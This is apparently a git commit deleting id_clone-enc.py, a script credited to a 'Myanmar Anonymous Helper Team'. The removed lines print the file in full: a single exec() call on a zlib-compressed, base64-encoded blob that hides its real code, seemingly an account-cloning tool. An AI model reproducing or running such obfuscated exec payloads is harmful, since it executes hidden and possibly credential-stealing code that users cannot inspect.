b888682315d5b64e94acc506f23a3374f808e981
Hydra_z4l <125865996+Htoosansain@users.noreply.github.com>
2023-03-08 23:35:11 +0630

    Delete id_clone-enc.py

--- id_clone-enc.py
+++
@@ -1,8 +0,0 @@
-##   Author     :    Myanmar Anonymous Helper Team
-##   Developer  :    z4l ( MAHT Online Class )
-##   Facebook   :    https://www.facebook.com/mathanonymousteam?mibextid=ZbWKwL
-##   Copyright  :    မည်သူမဆိုလေ့လာနိုင်သည်
-
-
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("eJzVVUtv00AQvvtXjNyDHbV1YlpRKIqggCokqDi0CIm2iuxkmqzwes3umrQFJB8QB8SR96tQiZcEAk5I/BvzC/gJ7PoVJzwlTrUyjj0737czu7Ofp6YAYCmWA8ZBX4v6trLjhdTjsBSycIeyWMAZDCLksIYeNaY05DRexYBpXw7ZnQ/AhpWlM2twPgxIiHAq8ISARh6+7HXRZ+xyOcNAykgsNpvD4dDZKsacLqNN6smBV04r1XTHKfFxW5Je+5J/8ezwXM53ikU7nPQHsuBLk0dpcjtNvqbJ8zT5lL3eSpMPafIxTZ6myec0+ZI9vE+Tu6X/ZhmvgYZBaMS4BEkozjAxI3YElD6KXZUV2UWDCUcNSKS22Q3Q42bDMIyA9Rm0wTRNY2Pb9dfdY3OHabacruuO/U8+Twa41fUrptIqLPyCdhRQZ1mo5eNOBLljnJPT1FiOHvpNVdX7v+RydP5nlu97d/bG8FC56kyVz4ADcRkbrbk5XfIC/ZbsH7ifLqDYsxZdn96E788e3FX2VtkbZU+U7St7lVeb745WAqgh3RL5qEDfV/ZQ2b0Cre35CP9n8Rl1YsH6mHokgHoCNCeoVGSQwU/0daDWmIrjSJUZZxTGOFbVcQchPYlV9FwZ/abIX9fyYhy2ke32/KG/VKHDWrR2HgrmdwXzK2WvlT0tVudlNUUJ0cfZdVpOdjjqzsnOO9I6qJ1naDmt6+12rz+rvjjhf3w8tFpHnIQSbK3ZWruNSvhjHgTEdyKPCzT8dqX5zknOhgK53TB8R6DsKHcvwA5nPpPCXvYCgXrI6/UG6PWQt9dt64ICzHp9DKU1A9Yy4bjFtq3GphEL3lH5qBxsEkaxtK0+uYrqC6PbjUvVIaQHVqPx59KlQ7FZ9FinKrmTt3pHl65LHQ5IgLDGY1zMBJOjaPuOJrK3rN+u4rU8xRtNq5GhRjeyBWaELArQhJBJICH4Th+lWjm7AYuVKOcE0+2RTHdZKEkYY+YQUUAk9tojrJO5bGtsSs0SehTb9Y1x4vBKzCTaBcn6/KbDMQpUAbY1a81Y2dqV8FW10kJyO0+oxp01gV3OMG1eN6eL+BF4VMEP2yxSDg==")))
